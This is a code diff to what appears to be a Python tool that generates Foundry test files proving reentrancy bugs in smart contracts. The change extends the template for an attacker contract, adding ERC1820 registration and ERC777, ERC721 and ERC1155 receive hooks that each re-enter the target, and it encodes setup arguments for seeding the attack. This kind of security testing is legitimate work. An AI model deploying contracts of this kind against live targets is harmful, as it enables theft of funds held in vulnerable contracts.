@@ -1680,20 +1680,16 @@ def _render_reentrancy_test(
     setup_signature: str | None = None,
     seed_fund: str | None = None,
     entitlement_signature: str | None = None,
+    setup_abi: dict[str, Any] | None = None,
 ):
     target_lit = f"address(uint160(0x00{target.address[2:].lower()}))"
     params = list(fn.get("inputs") or [])
-    expressions = [
-        _basic_solidity_expr(str(item.get("type") or ""), str(value))
-        for item, value in zip(params, values)
-    ]
-    encoded_args = [
-        "address(hostile)" if str(item.get("type") or "").lower() == "address" else expr
-        for item, expr in zip(params, expressions)
-    ]
+    argument_declarations, expressions = _render_abi_arguments(
+        params, values, actor_expr="address(hostile)", prefix="lowkeyAttackArg"
+    )
     payload_expr = (
-        f'abi.encodeWithSignature("{signature}", {", ".join(encoded_args)})'
-        if encoded_args else f'abi.encodeWithSignature("{signature}")'
+        f'abi.encodeWithSignature("{signature}", {", ".join(expressions)})'
+        if expressions else f'abi.encodeWithSignature("{signature}")'
     )
     setup_block = """        uint256 targetBalanceBeforeFunding = TARGET.balance;
 """
@@ -1702,11 +1698,23 @@ def _render_reentrancy_test(
         setup_block += f'        vm.deal(TARGET, {seed_amount});\n'
     setup_block += """        uint256 targetBalanceBeforeSetup = TARGET.balance;
 """
-    if setup_signature:
-        seed_value = _solidity_amount_literal(seed_fund) if seed_fund else "2 wei"
-        setup_block += f'        vm.deal(address(hostile), ({seed_value}) + 1 wei);\n'
+    if setup_abi is None and setup_signature:
+        setup_abi = {"name": setup_signature.split("(", 1)[0], "inputs": [], "stateMutability": "payable"}
+    if setup_abi is not None:
+        setup_signature = _format_signature(setup_abi)
+        setup_declarations, setup_expressions = _render_setup_arguments(
+            list(setup_abi.get("inputs") or []), actor_expr="address(hostile)", prefix="lowkeySetupArg"
+        )
+        setup_args = ", " + ", ".join(setup_expressions) if setup_expressions else ""
+        setup_mutability = str(setup_abi.get("stateMutability") or "").lower()
+        seed_value = (
+            _solidity_amount_literal(seed_fund) if seed_fund
+            else ("2 wei" if setup_mutability == "payable" else "0")
+        )
+        setup_block += f"        vm.deal(address(hostile), ({seed_value}) + 1 wei);\n"
         setup_block += f"""
-        bytes memory setupData = abi.encodeWithSignature("{setup_signature}");
+        {setup_declarations}
+        bytes memory setupData = abi.encodeWithSignature("{setup_signature}"{setup_args});
         (bool seeded, ) = address(hostile).call{{value: {seed_value}}}(
             abi.encodeWithSignature("seed(bytes)", setupData)
         );
@@ -1756,6 +1764,10 @@ def _render_reentrancy_test(
 """
 
     return _render_common_header() + f"""
+interface ILowkeyERC1820Registry {{
+    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
+}}
+
 contract LowkeyBreakReentrant {{
     address public immutable target;
     bytes public payload;
@@ -1768,6 +1780,43 @@ contract LowkeyBreakReentrant {{
 
     constructor(address _target) {{
         target = _target;
+        address registry = 0x1820a4B7618Bde71Dce8cdc73aAB6C95905faD24;
+        if (registry.code.length != 0) {{
+            try ILowkeyERC1820Registry(registry).setInterfaceImplementer(
+                address(this), keccak256("ERC777TokensRecipient"), address(this)
+            ) {{ }} catch {{ }}
+        }}
+    }}
+
+    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {{
+        return interfaceId == 0x01ffc9a7 || interfaceId == 0x4e2312e0 || interfaceId == 0x150b7a02;
+    }}
+
+    function tokensReceived(
+        address, address, address, uint256, bytes calldata, bytes calldata
+    ) external {{
+        _reenter();
+    }}
+
+    function onERC1155Received(address, address, uint256, uint256, bytes calldata)
+        external returns (bytes4)
+    {{
+        _reenter();
+        return 0xf23a6e61;
+    }}
+
+    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
+        external returns (bytes4)
+    {{
+        _reenter();
+        return 0xbc197c81;
+    }}
+
+    function onERC721Received(address, address, uint256, bytes calldata)
+        external returns (bytes4)
+    {{
+        _reenter();
+        return 0x150b7a02;
     }}
 
     function setPayload(bytes calldata _payload) external {{
@@ -1811,6 +1860,7 @@ contract LowkeyBreakReentrancy is Test {{
 
     function test_break_reentrancy() public {{
         LowkeyBreakReentrant hostile = new LowkeyBreakReentrant(TARGET);
+{argument_declarations}
         bytes memory payload = {payload_expr};
         hostile.setPayload(payload);
 {setup_block}
